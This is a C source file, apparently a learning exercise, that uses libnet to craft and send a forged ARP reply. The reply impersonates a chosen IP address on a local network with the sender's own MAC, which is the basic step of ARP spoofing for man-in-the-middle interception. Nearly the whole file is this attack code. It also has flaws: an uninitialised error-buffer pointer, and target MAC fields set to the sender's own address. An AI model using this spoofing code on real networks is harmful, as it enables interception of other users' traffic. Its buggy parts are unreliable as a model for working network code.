// #include<net/if_arp.h> 
#include<libnet.h>
#include <pcap.h>
#include"utils.h"
static libnet_ethernet_hdr eth_hdr;
/*
verify using -
tcpdump  -n -ttt "host xx.xxx.x.xxx and arp"
*/

int main(int argc, char **argv)
{
    const char *device = NULL; // not localhost
    char targ_ip_addr_char[16] = "192.168.43.179";//"127.0.0.1"; src ip addr in network
    char src_ip_addr_char[16] = "192.168.43.122"; // ip which needs to be imitated as (should be in network)
    // char targ_hw_addr_char[18] = "ff:ff:ff:ff:ff:ff";  // broadcast
    char *err_buff;
    libnet_t *lc;  // libnet context

    lc = libnet_init(LIBNET_LINK_ADV, device, err_buff);  // initialised in advanced mode for cull packet.
    if (lc == NULL)
    {
        fprintf(stderr, "%s\n", err_buff);
        return 1;
    }

    u_int8_t localhost_hw_addr[6] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
    uint32_t src_ip_addr, targ_ip_addr;
    int len;

    struct libnet_ether_addr *src_hw_addr = libnet_get_hwaddr(lc);
    src_ip_addr = libnet_name2addr4(lc, src_ip_addr_char, LIBNET_DONT_RESOLVE);
    // uint8_t * targ_hw_addr = libnet_hex_aton(targ_hw_addr_char, &len);
    targ_ip_addr = libnet_name2addr4(lc, targ_ip_addr_char, LIBNET_DONT_RESOLVE);

    if (src_ip_addr == -1 || targ_ip_addr == -1 || src_hw_addr == NULL)
    {
        fprintf(stderr, "err");
        return 1;
    }

    libnet_ptag_t a_ptag = libnet_autobuild_arp(ARPOP_REPLY, src_hw_addr->ether_addr_octet, (uint8_t *)&src_ip_addr,
                                                src_hw_addr->ether_addr_octet, (uint8_t *)&targ_ip_addr, lc);
    if(a_ptag == -1)
    {
        fprintf(stderr, "%s\n", libnet_geterror(lc));
        return 1;
    }

    // arp is unicast
    libnet_ptag_t e_ptag = libnet_autobuild_ethernet(src_hw_addr->ether_addr_octet, ETHERTYPE_ARP, lc);
    if(e_ptag == -1)
    {
        fprintf(stderr, "%s\n", libnet_geterror(lc));
        return 1;
    }

    uint8_t *packet, *header;
    uint32_t packet_size, header_size;
    if (libnet_adv_cull_packet(lc, &packet, &packet_size) == -1)
    {
        fprintf(stderr, "%s\n", libnet_geterror(lc));
    }
    printf("Packet size: %d\n", packet_size);

    if (libnet_adv_cull_header(lc, a_ptag, &header, &header_size) == -1)
    {
        fprintf(stderr, "%s\n", libnet_geterror(lc));
    }
    printf("ARP Header size: %d\n", header_size);

    if (libnet_adv_cull_header(lc, e_ptag, &header, &header_size) == -1)
    {
        fprintf(stderr, "%s\n", libnet_geterror(lc));
    }
    printf("ETH Header size: %d\n", header_size);

    if (libnet_adv_write_link(lc, packet, packet_size) == -1) {
        fprintf(stderr, "%s\n",libnet_geterror(lc));
    }

    libnet_adv_free_packet(lc, packet);
    libnet_destroy(lc);
    return 0;

}